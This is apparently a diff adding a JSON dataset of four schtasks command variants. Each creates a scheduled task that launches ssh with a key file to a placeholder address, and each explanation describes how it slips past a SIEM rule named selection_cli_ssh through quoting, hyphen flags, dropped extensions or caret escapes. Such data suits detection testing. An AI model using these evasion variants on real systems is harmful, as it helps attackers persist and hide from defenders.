@@ -1,0 +1,18 @@
+[
+  {
+    "output": "schtasks.exe -create /tn \"TestTask1\" /tr \"C:\\Windows\\System32\\OpenSSH\\ssh.exe -i C:\\Temp\\test.txt user@192.0.2.10\" /sc daily",
+    "explanation": "Substitution technique: Replaced the forward slash action flag indicator ('/create') with a hyphen ('-create'). Windows schtasks utility accepts hyphens natively, but changing it avoids matching the strict literal string ' /create ' (with a leading and trailing space) in the selection_cli_ssh condition."
+  },
+  {
+    "output": "schtasks.exe \"/create\" /tn \"TestTask1\" /tr \"C:\\Windows\\System32\\OpenSSH\\ssh.exe -i C:\\Temp\\test.txt user@192.0.2.10\" /sc daily",
+    "explanation": "Insertion technique: Individual command action flag '/create' is wrapped inside double quotes. The native Windows command line parser processes quoted arguments seamlessly, but it breaks the continuous substring logic monitored by the SIEM, thereby evading the selection_cli_ssh rule criteria."
+  },
+  {
+    "output": "schtasks.exe /create /tn \"TestTask1\" /tr \"C:\\Windows\\System32\\OpenSSH\\ssh -i C:\\Temp\\test.txt user@192.0.2.10\" /sc daily",
+    "explanation": "Omission technique: Omitted the '.exe' extension from the target execution path ('ssh' instead of 'ssh.exe'). Windows command interpretation automatically falls back to finding executable extensions like .exe, keeping test behavior identical while avoiding the exact string match requirement for 'ssh.exe'."
+  },
+  {
+    "output": "cmd.exe /c schtasks.exe /cr^eate /tn \"TestTask1\" /tr \"C:\\Windows\\System32\\OpenSSH\\ssh.exe -i C:\\Temp\\test.txt user@192.0.2.10\" /sc daily",
+    "explanation": "Insertion technique: Injected a caret (^) escape character into the action string parameter ('/cr^eate') when running via cmd.exe. The shell interprets and strips the escape character before dropping into the active process, but the raw process creation log registers the literal caret, which circumvents the exact literal block ' /create '."
+  }
+]
